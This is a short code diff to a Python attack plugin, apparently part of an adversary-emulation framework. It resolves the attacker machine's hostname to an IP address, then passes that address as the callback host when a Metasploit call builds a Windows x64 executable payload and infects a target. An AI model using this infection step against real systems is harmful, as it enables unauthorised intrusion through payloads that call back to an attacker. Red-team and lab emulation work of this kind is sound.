@@ -4,6 +4,7 @@
 
 from plugins.base.attack import AttackPlugin
 from app.metasploit import MetasploitInstant
+import socket
 
 
 class MetasploitMigratePlugin(AttackPlugin):
@@ -36,11 +37,13 @@ class MetasploitMigratePlugin(AttackPlugin):
                                        attacker=self.attacker_machine_plugin,
                                        username=self.metasploit_user)
 
+        ip = socket.gethostbyname(self.attacker_machine_plugin.get_ip())
+
         metasploit.smart_infect(target,
                                 payload=payload_type,
                                 architecture="x64",
                                 platform="windows",
-                                lhost=self.attacker_machine_plugin.get_ip(),
+                                lhost=ip,
                                 format="exe",
                                 outfile=payload_name
                                 )
